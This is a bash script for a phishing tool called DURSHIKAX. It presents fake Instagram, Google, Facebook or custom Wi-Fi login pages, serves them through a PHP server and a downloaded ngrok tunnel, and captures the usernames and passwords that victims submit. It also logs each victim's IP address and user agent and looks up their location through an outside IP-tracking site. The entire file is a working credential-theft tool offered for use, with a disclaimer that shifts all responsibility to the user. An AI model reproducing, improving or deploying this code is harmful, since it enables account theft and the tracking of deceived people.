#!/bin/bash
trap 'printf "\n";stop;exit 1' 2


dependencies() {

command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
command -v curl > /dev/null 2>&1 || { echo >&2 "I require curl but it's not installed. Install it. Aborting."; exit 1; }

}

menu() {

printf "          \e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;94m Instagram\e[0m      \e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;94m Google\e[0m        \e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;94m Facebook\e[0m               \n"                                


read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose a bait: \e[0m\en' option


if [[ $option == 1 ]]; then
server="instagram"
start

elif [[ $option == 2 ]]; then
server="google"
start

elif [[ $option == 3 ]]; then
server="facebook"
start


else
printf "\e[1;93m [!] Invalid option!\e[0m\n"
menu
fi
}

stop() {

checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi
if [[ $checkphp == *'php'* ]]; then
pkill -f -2 php > /dev/null 2>&1
killall -2 php > /dev/null 2>&1
fi


}

banner() {


printf "     \e[34m\e[1;77m
▓█████▄  █    ██  ██▀███    ██████  ██░ ██  ██▓ ██ ▄█▀▄▄▄      ▒██   ██▒
▒██▀ ██▌ ██  ▓██▒▓██ ▒ ██▒▒██    ▒ ▓██░ ██▒▓██▒ ██▄█▒▒████▄    ▒▒ █ █ ▒░
░██   █▌▓██  ▒██░▓██ ░▄█ ▒░ ▓██▄   ▒██▀▀██░▒██▒▓███▄░▒██  ▀█▄  ░░  █   ░
░▓█▄   ▌▓▓█  ░██░▒██▀▀█▄    ▒   ██▒░▓█ ░██ ░██░▓██ █▄░██▄▄▄▄██  ░ █ █ ▒ 
░▒████▓ ▒▒█████▓ ░██▓ ▒██▒▒██████▒▒░▓█▒░██▓░██░▒██▒ █▄▓█   ▓██▒▒██▒ ▒██▒
 ▒▒▓  ▒ ░▒▓▒ ▒ ▒ ░ ▒▓ ░▒▓░▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒░▓  ▒ ▒▒ ▓▒▒▒   ▓▒█░▒▒ ░ ░▓ ░
 ░ ▒  ▒ ░░▒░ ░ ░   ░▒ ░ ▒░░ ░▒  ░ ░ ▒ ░▒░ ░ ▒ ░░ ░▒ ▒░ ▒   ▒▒ ░░░   ░▒ ░
 ░ ░  ░  ░░░ ░ ░   ░░   ░ ░  ░  ░   ░  ░░ ░ ▒ ░░ ░░ ░  ░   ▒    ░    ░  
   ░       ░        ░           ░   ░  ░  ░ ░  ░  ░        ░  ░ ░    ░  
 ░
\e[0m\n"
}
clear
printf "     \e[1;92m::     DURSHIKAX v1! By @qcod3r\e[0m\n"
printf "     \e[1;92m::     By using this tool, you confirm that all responsibilities belong to you.\e[0m\n"
printf "     \e[1;92m::     You also agree that the best hacker team is TurkHackTeam.\e[0m\n"
printf "     \e[101m\e[1;77m::     Ne Mutlu Türk'üm Diyene!  |☾☆|  :: \e[0m\n"
createpage() {
default_cap1="Wi-fi Session Expired"
default_cap2="Please login again."
default_user_text="Username:"
default_pass_text="Password:"
default_sub_text="Log-In"

read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Title 1 (Default: Wi-fi Session Expired): \e[0m' cap1
cap1="${cap1:-${default_cap1}}"

read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Title 2 (Default: Please login again.): \e[0m' cap2
cap2="${cap2:-${default_cap2}}"

read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Username field (Default: Username:): \e[0m' user_text
user_text="${user_text:-${default_user_text}}"

read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Password field (Default: Password:): \e[0m' pass_text
pass_text="${pass_text:-${default_pass_text}}"

read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Submit field (Default: Log-In): \e[0m' sub_text
sub_text="${sub_text:-${default_sub_text}}"

echo "<!DOCTYPE html>" > sites/create/login.html
echo "<html>" >> sites/create/login.html
echo "<body bgcolor=\"gray\" text=\"white\">" >> sites/create/login.html
IFS=$'\n'
printf '<center><h2> %s <br><br> %s </h2></center><center>\n' $cap1 $cap2 >> sites/create/login.html
IFS=$'\n'
printf '<form method="POST" action="login.php"><label>%s </label>\n' $user_text >> sites/create/login.html
IFS=$'\n'
printf '<input type="text" name="username" length=64>\n' >> sites/create/login.html
IFS=$'\n'
printf '<br><label>%s: </label>' $pass_text >> sites/create/login.html
IFS=$'\n'
printf '<input type="password" name="password" length=64><br><br>\n' >> sites/create/login.html
IFS=$'\n'
printf '<input value="%s" type="submit"></form>\n' $sub_text >> sites/create/login.html
printf '</center>' >> sites/create/login.html
printf '<body>\n' >> sites/create/login.html
printf '</html>\n' >> sites/create/login.html


}

catch_cred() {

account=$(grep -o 'Account:.*' sites/$server/usernames.txt | cut -d " " -f2)
IFS=$'\n'
password=$(grep -o 'Pass:.*' sites/$server/usernames.txt | cut -d ":" -f2)
echo "Credentials of '$ip'" >> ./logs/logs.txt
echo "Username: $account" >> ./logs/logs.txt
echo "Password: $password" >> ./logs/logs.txt
echo "" >> ./logs/logs.txt
echo "«««««««««« Qcod3r »»»»»»»»»»" >> ./logs/logs.txt
echo "" >> ./logs/logs.txt
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Account:\e[0m\e[1;77m %s\n\e[0m" $account
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Password:\e[0m\e[1;77m %s\n\e[0m" $password

printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] All credentials and logs saved:\e[0m\e[1;77m logs/logs.txt\e[0m\n"
if [[ -e sites/$server/ip.txt ]]; then
rm -rf sites/$server/ip.txt

fi
if [[ -e sites/$server/usernames.txt ]]; then
rm -rf sites/$server/usernames.txt

fi
checkfound
}

getcredentials() {
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] The hook arrivals:\e[0m\n"
while [ true ]; do


if [[ -e "sites/$server/usernames.txt" ]]; then
printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Fish caught on the hook!\n"
catch_cred

fi
sleep 1
done 


}

catch_ip() {
touch sites/$server/saved.usernames.txt
ip=$(grep -a 'IP:' sites/$server/ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
ua=$(grep 'User-Agent:' sites/$server/ip.txt | cut -d '"' -f2)
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Victim IP:\e[0m\e[1;77m %s\e[0m\n" $ip
echo "Fish IP: $ip" >> ./logs/logs.txt
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] User-Agent:\e[0m\e[1;77m %s\e[0m\n" $ua
echo "User-Agent: $ua" >> ./logs/logs.txt

if [[ -e iptracker.log ]]; then
rm -rf iptracker.log
fi

IFS='\n'
iptracker=$(curl -s -L "www.ip-tracker.org/locator/ip-lookup.php?ip=$ip" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > iptracker.log)
IFS=$'\n'
continent=$(grep -o 'Continent.*' iptracker.log | head -n1 | cut -d ">" -f3 | cut -d "<" -f1)
hostnameip=$(grep  -o "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f7 | cut -d ">" -f2)
if [[ $hostnameip != "" ]]; then
printf "\e[1;92m[*] Hostname:\e[0m\e[1;77m %s\e[0m\n" $hostnameip
echo "Hostname: $hostnameip" >> ./logs/logs.txt
fi
##

reverse_dns=$(grep -a "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f1)
if [[ $reverse_dns != "" ]]; then
printf "\e[1;92m[*] Reverse DNS:\e[0m\e[1;77m %s\e[0m\n" $reverse_dns
echo "Reverse DNS: $reverse_dns" >> ./logs/logs.txt
fi
##


if [[ $continent != "" ]]; then
printf "\e[1;92m[*] IP Continent:\e[0m\e[1;77m %s\e[0m\n" $continent
echo "IP Continent: $cntinent" >> ./logs/logs.txt
fi
##

country=$(grep -o 'Country:.*' iptracker.log | cut -d ">" -f3 | cut -d "&" -f1)
if [[ $country != "" ]]; then
printf "\e[1;92m[*] IP Country:\e[0m\e[1;77m %s\e[0m\n" $country
echo "IP Country: $country" >> ./logs/logs.txt
fi
##

state=$(grep -o "tracking lessimpt.*" iptracker.log | cut -d "<" -f1 | cut -d ">" -f2)
if [[ $state != "" ]]; then
printf "\e[1;92m[*] State:\e[0m\e[1;77m %s\e[0m\n" $state
echo "State: $state" >> ./logs/logs.txt
fi
##
city=$(grep -o "City Location:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)

if [[ $city != "" ]]; then
printf "\e[1;92m[*] City Location:\e[0m\e[1;77m %s\e[0m\n" $city
echo "City Location: $city" >> ./logs/logs.txt
fi
##

isp=$(grep -o "ISP:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $isp != "" ]]; then
printf "\e[1;92m[*] ISP:\e[0m\e[1;77m %s\e[0m\n" $isp
echo "ISP: $isp" >> ./logs/logs.txt
fi
##

as_number=$(grep -o "AS Number:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $as_number != "" ]]; then
printf "\e[1;92m[*] AS Number:\e[0m\e[1;77m %s\e[0m\n" $as_number
echo "AS Number: $as_number" >> ./logs/logs.txt
fi
##

ip_speed=$(grep -o "IP Address Speed:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $ip_speed != "" ]]; then
printf "\e[1;92m[*] IP Address Speed:\e[0m\e[1;77m %s\e[0m\n" $ip_speed
echo "IP Address Speed: $ip_speed" >> ./logs/logs.txt
fi
##
ip_currency=$(grep -o "IP Currency:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)

if [[ $ip_currency != "" ]]; then
printf "\e[1;92m[*] IP Currency:\e[0m\e[1;77m %s\e[0m\n" $ip_currency
echo "IP Currency: $ip_currency" >> ./logs/logs.txt
echo "" >> ./logs/logs.txt
fi
##
printf "\n"
rm -rf iptracker.log

getcredentials
}

start() {
if [[ -e sites/$server/ip.txt ]]; then
rm -rf sites/$server/ip.txt

fi
if [[ -e sites/$server/usernames.txt ]]; then
rm -rf sites/$server/usernames.txt

fi


if [[ -e ngrok ]]; then
echo ""
else

printf "\e[1;92m[\e[0m*\e[1;92m] Downloading Ngrok...\n"
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1

if [[ -e ngrok-stable-linux-arm.zip ]]; then
unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-arm.zip
else
printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
exit 1
fi



else
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
if [[ -e ngrok-stable-linux-386.zip ]]; then
unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-386.zip
else
printf "\e[1;93m[!] Download error... \e[0m\n"
exit 1
fi
fi
fi

printf "\e[1;92m[\e[0m*\e[1;92m] Fish bait is setting...\n"
cd sites/$server && php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
sleep 2
printf "\e[1;92m[\e[0m*\e[1;92m] Fish bait gets caught on the hook...\n"
./ngrok http 3333 > /dev/null 2>&1 &
sleep 5
clear
seelog
}

qcod3r() {
link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
printf "\n"
printf "\e[1;92m[\e[0m*\e[1;92m] Start hunting with this bait:\e[0m\e[1;77m %s\e[0m\n" $link
checkfound
}

seelog() {

read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Would you like to see logs? [y/n ?] \e[0m\en' logs


if [[ $logs == y ]]; then
xdg-open http://localhost:4040
qcod3r

elif [[ $logs == n ]]; then
qcod3r


else
printf "\e[1;93m [!] Invalid option!\e[0m\n"
seelog
fi

}


checkfound() {
if [[ -e sites/$server/saved.ip.txt ]]; then
rm -rf sites/$server/saved.ip.txt

fi
if [[ -e sites/$server/saved.usernames.txt ]]; then
rm -rf sites/$server/saved.usernames.txt

fi
printf "\n"
printf "\n\e[1;31;42m ### Fish Waiting ... ###\e[0m \n"

while [ true ]; do


if [[ -e "sites/$server/ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m*\e[1;92m] Fish Found!\n"
echo "~ $server ~" >> ./logs/logs.txt
echo "" >> ./logs/logs.txt
catch_ip

fi
sleep 1
done 

}
banner
dependencies
menu

